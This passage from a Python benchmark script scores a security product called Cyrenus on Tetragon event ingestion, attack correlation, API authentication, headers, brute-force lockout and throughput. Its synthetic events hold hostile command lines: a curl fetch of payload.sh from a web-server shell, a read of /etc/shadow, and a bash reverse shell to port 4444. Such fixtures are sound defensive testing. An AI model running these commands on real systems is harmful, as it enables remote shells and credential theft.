    # B2 & B3: Inject live Tetragon RCE / FIM / Socket events -> DB ingestion & Cross-Layer Correlation
    now_iso = datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%S.000000Z")
    corr_target_ip = "10.200.0.10" if not args.skip_xdp else "127.0.0.1"
    synthetic_events = [
        {
            "process_exec": {
                "process": {
                    "exec_id": "bench-exec-1",
                    "pid": 4242,
                    "uid": 33,
                    "binary": "/bin/sh",
                    "arguments": "-c id; curl http://10.200.0.10/payload.sh",
                    "start_time": now_iso,
                    "parent_exec_id": "bench-parent-1",
                },
                "parent": {"exec_id": "bench-parent-1", "pid": 101, "binary": "/usr/sbin/nginx"},
            },
            "node_name": "cyrenus-bench",
            "time": now_iso,
        },
        {
            "process_kprobe": {
                "process": {
                    "exec_id": "bench-fim-2",
                    "pid": 4243,
                    "uid": 0,
                    "binary": "/usr/bin/python3",
                    "arguments": "/tmp/dump_shadow.py",
                    "start_time": now_iso,
                },
                "parent": {"binary": "/bin/sh"},
                "function_name": "security_file_open",
                "args": [{"file_arg": {"path": "/etc/shadow"}}],
                "action": "KPROBE_ACTION_POST",
            },
            "policy_name": "file-integrity",
            "time": now_iso,
        },
        {
            "process_kprobe": {
                "process": {
                    "exec_id": "bench-net-3",
                    "pid": 4244,
                    "uid": 33,
                    "binary": "/bin/bash",
                    "arguments": f"-i >& /dev/tcp/{corr_target_ip}/4444 0>&1",
                    "start_time": now_iso,
                },
                "parent": {"binary": "/usr/sbin/nginx"},
                "function_name": "tcp_connect",
                "args": [{"sock_arg": {"family": "AF_INET", "protocol": "IPPROTO_TCP", "saddr": corr_target_ip, "daddr": corr_target_ip, "sport": 49152, "dport": 4444}}],
                "action": "KPROBE_ACTION_SIGKILL",
            },
            "policy_name": "anti-rce",
            "time": now_iso,
        },
    ]

    with open(args.tetragon_log, "a", encoding="utf-8", newline="\n") as fp:
        for ev in synthetic_events:
            fp.write(json.dumps(ev) + "\n")
        fp.flush()

    time.sleep(1.5)

    c = CheckResult("B2", "Host Security (Tetragon)", "Tetragon RCE & FIM Log Ingestion -> SQLite Security Events", 6.0)
    sec_events = client.get_json("/api/v1/security/events?limit=50").get("events", [])
    sec_stats = client.get_json("/api/v1/security/stats")
    has_rce = any("/bin/sh" in e.get("binary_path", "") or "/bin/bash" in e.get("binary_path", "") for e in sec_events)
    has_fim = any(e.get("file_path") == "/etc/shadow" for e in sec_events)
    has_sigkill = any(e.get("action") == "KPROBE_ACTION_SIGKILL" and e.get("dst_port") == 4444 for e in sec_events)
    c.set(has_rce and has_fim and has_sigkill and int(sec_stats.get("critical_alerts", 0)) >= 2,
          f"events={len(sec_events)}, critical={sec_stats.get('critical_alerts')}, rce={has_rce}, fim={has_fim}, sigkill_sock={has_sigkill}")
    checks.append(c)

    c = CheckResult("B3", "Host Security (Tetragon)", "Cross-Layer XDP + Host Attack Correlation Detection", 7.0)
    corrs = client.get_json("/api/v1/security/correlations?min_confidence=0.7&limit=50").get("correlations", [])
    matched_corr = None
    for cr in corrs:
        if cr.get("source_ip") == corr_target_ip and int(cr.get("security_event_id", 0)) > 0:
            matched_corr = cr
            break
    has_net_link = (matched_corr is not None) and (args.skip_xdp or int(matched_corr.get("network_event_id", 0)) > 0)
    conf_ok = (matched_corr is not None) and float(matched_corr.get("confidence_score", 0.0)) >= 0.75
    c.set(has_net_link and conf_ok,
          f"correlations={len(corrs)}, match_ip={matched_corr.get('source_ip') if matched_corr else 'none'}, "
          f"net_id={matched_corr.get('network_event_id') if matched_corr else 0}, "
          f"sec_id={matched_corr.get('security_event_id') if matched_corr else 0}, "
          f"conf={matched_corr.get('confidence_score') if matched_corr else 0}")
    checks.append(c)

    # =======================================================================
    # CATEGORY C: Control-Plane Hardening & Auth Security (15 pts)
    # =======================================================================
    # C1: Unauthenticated API & WebSocket Rejection + Auth WS Upgrade (5 pts)
    c = CheckResult("C1", "Control-Plane Security", "API 401 Enforcement & Authenticated WebSocket Upgrade", 5.0)
    u1, _, _ = client.request("GET", "/api/v1/attacks", auth=False)
    u2, _, _ = client.request("GET", "/api/v1/system/stats", auth=False)
    u3, _, _ = client.request("GET", "/api/v1/security/events", auth=False)
    u4, _, _ = client.request("POST", "/api/v1/rules", body={"ip": "1.2.3.4"}, auth=False)
    ws_unauth_code, _, _ = ws_connect_and_read(api_host, ws_port, "/", timeout_sec=1.5)
    ws_bad_code, _, _ = ws_connect_and_read(api_host, ws_port, "/?token=invalid_token_xyz", timeout_sec=1.5)
    ws_ok_code, _, ws_msgs = ws_connect_and_read(api_host, ws_port, f"/?token={client.token}", timeout_sec=2.5)
    ok = (u1 == 401 and u2 == 401 and u3 == 401 and u4 == 401 and
          ws_unauth_code != 101 and ws_bad_code != 101 and ws_ok_code == 101)
    c.set(ok, f"api_unauth=({u1},{u2},{u3},{u4}), ws_unauth={ws_unauth_code}, ws_bad={ws_bad_code}, ws_auth={ws_ok_code} ({len(ws_msgs)} msgs)")
    checks.append(c)

    # C2: Security Response Headers & Strict CORS (5 pts)
    c = CheckResult("C2", "Control-Plane Security", "Security Headers (CSP/XFO/XCTO) & Strict Same-Origin CORS", 5.0)
    _, api_hdrs, _ = client.request("GET", "/api/v1/system/health", auth=False, headers={"Origin": "https://evil.example"})
    _, html_hdrs, _ = client.request("GET", "/login.html", auth=False)
    has_xcto = api_hdrs.get("x-content-type-options") == "nosniff"
    has_xfo = api_hdrs.get("x-frame-options") == "DENY"
    has_ref = bool(api_hdrs.get("referrer-policy"))
    has_nocache = "no-store" in api_hdrs.get("cache-control", "")
    has_csp = bool(html_hdrs.get("content-security-policy"))
    no_wildcard_cors = api_hdrs.get("access-control-allow-origin", "") != "*"
    c.set(has_xcto and has_xfo and has_ref and has_nocache and has_csp and no_wildcard_cors,
          f"XCTO={has_xcto}, XFO={has_xfo}, CSP={has_csp}, no_store={has_nocache}, strict_cors={no_wildcard_cors}")
    checks.append(c)

    # C3: Brute-Force HTTP 429 Lockout & Anti-Spoof XFF (5 pts)
    c = CheckResult("C3", "Control-Plane Security", "Brute-Force HTTP 429 Lockout & X-Forwarded-For Anti-Spoofing", 5.0)
    # Connect from 127.0.0.3 (not trusted_proxy) while rotating fake X-Forwarded-For headers
    codes: List[int] = []
    retry_after_hdr = ""
    for attempt in range(6):
        sc, hdrs, _ = client.request(
            "POST",
            "/api/v1/auth/login",
            body={"username": args.username, "password": f"wrong_pass_{attempt}"},
            auth=False,
            headers={"X-Forwarded-For": f"198.51.100.{attempt + 10}"},
            source_ip="127.0.0.3",
        )
        codes.append(sc)
        if sc == 429:
            retry_after_hdr = hdrs.get("retry-after", "")
    # Verify legitimate client on 127.0.0.1 is NOT impacted by 127.0.0.3 lockout
    ok_code, _, _ = client.request(
        "POST",
        "/api/v1/auth/login",
        body={"username": args.username, "password": args.password},
        auth=False,
        source_ip="127.0.0.1",
    )
    ok = (codes[:5] == [401, 401, 401, 401, 401] and codes[5] == 429 and retry_after_hdr.isdigit() and ok_code == 200)
    c.set(ok, f"127.0.0.3 codes={codes} Retry-After={retry_after_hdr}, legit_login_127.0.0.1={ok_code}")
    checks.append(c)

    # =======================================================================
    # CATEGORY D: Data-Plane & Control-Plane Performance (10 pts)
    # =======================================================================
    # D1: API Latency & High-Rate Burst Throughput (5 pts)
    c = CheckResult("D1", "Performance & Telemetry", "Control-Plane API p95 Latency & High-Rate Burst Mitigation", 5.0)
    lat_ms: List[float] = []
    for _ in range(50):
        t0 = time.perf_counter()
        client.get_json("/api/v1/system/stats")
        lat_ms.append((time.perf_counter() - t0) * 1000.0)
    lat_ms.sort()
    p50 = statistics.median(lat_ms)
    p95 = lat_ms[int(len(lat_ms) * 0.95) - 1]

    burst_pps = 0.0
    burst_drop_ratio = 1.0
    if not args.skip_xdp:
        b = get_global_stats(client)
        t0 = time.perf_counter()
        # Blast 5,000 packets from already-auto-blocked 10.200.0.10
        sent_fast = run_netns_burst(args, "syn_v4", src_ip="10.200.0.10", count=5000, delay_us=0)
        elapsed = max(0.001, time.perf_counter() - t0)
        a = get_global_stats(client)
        dropped_fast = stats_delta(b, a, "dropped_packets")
        burst_pps = sent_fast / elapsed
        burst_drop_ratio = (dropped_fast / sent_fast) if sent_fast > 0 else 0.0

    ok = (p95 < 25.0) and (args.skip_xdp or (burst_drop_ratio >= 0.98 and burst_pps >= 1000.0))
    c.set(ok, f"api p50={p50:.2f}ms p95={p95:.2f}ms | burst={burst_pps:.0f} PPS, drop_ratio={burst_drop_ratio*100:.1f}%")
    checks.append(c)

    # D2: Live WebSocket Telemetry Accuracy (5 pts)
    c = CheckResult("D2", "Performance & Telemetry", "WebSocket Live Telemetry Stream & Counter Reconciliation", 5.0)
    _, _, live_msgs = ws_connect_and_read(api_host, ws_port, f"/?token={client.token}", timeout_sec=3.0)
    traffic_msgs: List[Dict[str, Any]] = []
    for raw in live_msgs:
        try:
            obj = json.loads(raw)
            if obj.get("type") == "traffic_update" and isinstance(obj.get("data"), dict):
                traffic_msgs.append(obj["data"])
        except Exception:
            pass
    final_stats = get_global_stats(client)
    ws_ok = False
    ws_detail = f"received {len(traffic_msgs)} traffic_update frames"
    if traffic_msgs:
        last = traffic_msgs[-1]
        ws_tot = int(last.get("total_packets", 0))
        ws_drop = int(last.get("dropped_packets", 0))
        api_tot = int(final_stats.get("total_packets", 0))
        api_drop = int(final_stats.get("dropped_packets", 0))
        # Both monotonic and coherent within small polling delta
        ws_ok = (ws_tot > 0 or args.skip_xdp) and abs(api_tot - ws_tot) <= max(100, int(api_tot * 0.05)) and abs(api_drop - ws_drop) <= max(100, int(api_drop * 0.05))
        ws_detail += f" | ws_total={ws_tot}/api_total={api_tot}, ws_drop={ws_drop}/api_drop={api_drop}"
    c.set(ws_ok, ws_detail)
    checks.append(c)

    # =======================================================================
    # Summarize Score (0 - 100)
    # =======================================================================
    total_earned = sum(ch.earned_pts for ch in checks)
    total_max = sum(ch.max_pts for ch in checks)
    score = round((total_earned / total_max) * 100.0, 1) if total_max > 0 else 0.0

    if score >= 90.0:
        tier = "Tier A (Production-Hardened)"
        tier_col = GREEN
    elif score >= 75.0:
        tier = "Tier B (Strong Protection)"
        tier_col = CYAN
    elif score >= 50.0:
        tier = "Tier C (Baseline)"
        tier_col = YELLOW
    else:
        tier = "Tier D (Vulnerable)"
        tier_col = RED

    log("")
    for ch in checks:
        badge = f"{GREEN}[PASS]{NC}" if ch.passed else f"{RED}[FAIL]{NC}"
        log(f"  {badge} {ch.check_id:3s} {ch.name:<62s} {ch.earned_pts:4.1f}/{ch.max_pts:4.1f}  ({ch.detail})")

    log("\n" + "=" * 90)
    log(f"{BOLD}FINAL SECURITY SCORE: {tier_col}{score:.1f} / 100.0{NC}  |  {tier_col}{tier}{NC}")
    log("=" * 90)

    report = {
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "url": args.url,
        "xdp_mode": sys_info.get("xdp_mode", "Unknown"),
        "score": score,
        "earned_points": round(total_earned, 2),
        "max_points": round(total_max, 2),
        "tier": tier,
        "global_stats": final_stats,
        "checks": [ch.to_dict() for ch in checks],
    }

    if args.report_json:
        with open(args.report_json, "w", encoding="utf-8", newline="\n") as fp:
            json.dump(report, fp, indent=2)
        log(f"JSON report written: {args.report_json}")

    if args.report_md:
        md_lines = [
            "# Cyrenus Security & Performance Benchmark Scorecard",
            "",
            f"- **Timestamp (UTC)**: `{report['timestamp']}`",
            f"- **XDP Mode**: `{report['xdp_mode']}`",
            f"- **Final Score**: **{score:.1f} / 100.0** ({tier})",
            "",
            "| ID | Category | Check | Status | Score | Telemetry / Detail |",
            "|----|----------|-------|--------|-------|--------------------|",
        ]
        for ch in checks:
            st_str = "PASS" if ch.passed else "FAIL"
            md_lines.append(
                f"| `{ch.check_id}` | {ch.category} | {ch.name} | **{st_str}** | {ch.earned_pts:.1f}/{ch.max_pts:.1f} | `{ch.detail}` |"
            )
        with open(args.report_md, "w", encoding="utf-8", newline="\n") as fp:
            fp.write("\n".join(md_lines) + "\n")
        log(f"Markdown report written: {args.report_md}")

    return 0 if score >= args.min_score else 1


def parse_args() -> argparse.Namespace:
    p = argparse.ArgumentParser(description="Cyrenus Security & Performance Benchmark Suite")
    p.add_argument("--send-vector", action="store_true", help=argparse.SUPPRESS)
    p.add_argument("--spec", default="", help=argparse.SUPPRESS)

    p.add_argument("--url", default="http://127.0.0.1:8181")
    p.add_argument("--ws-port", type=int, default=8182)
    p.add_argument("--username", default="admin")
    p.add_argument("--password", default="CyrenusBench#2026")
    p.add_argument("--netns", default="cy_ns")
    p.add_argument("--att-iface", default="veth_cy_att")
    p.add_argument("--host-ip", default="10.200.0.1")
    p.add_argument("--host-ipv6", default="fd00:200::1")
    p.add_argument("--host-vlan-ip", default="10.201.0.1")
    p.add_argument("--mac-host", default="")
    p.add_argument("--mac-att", default="")
    p.add_argument("--policy-dir", default="/tmp/cyrenus_bench/policies_src")
    p.add_argument("--deployed-dir", default="/tmp/cyrenus_bench/policies_deployed")
    p.add_argument("--tetragon-config", default="/tmp/cyrenus_bench/tetragon.yaml")
    p.add_argument("--tetragon-log", default="/tmp/cyrenus_bench/tetragon.log")
    p.add_argument("--report-json", default="")
    p.add_argument("--report-md", default="")
    p.add_argument("--min-score", type=float, default=90.0)
    p.add_argument("--skip-xdp", action="store_true")
    p.add_argument("--no-color", action="store_true")
    return p.parse_args()


if __name__ == "__main__":
    ns_args = parse_args()
    if ns_args.send_vector:
        sys.exit(send_vector_main(ns_args))
    sys.exit(main_benchmark(ns_args))

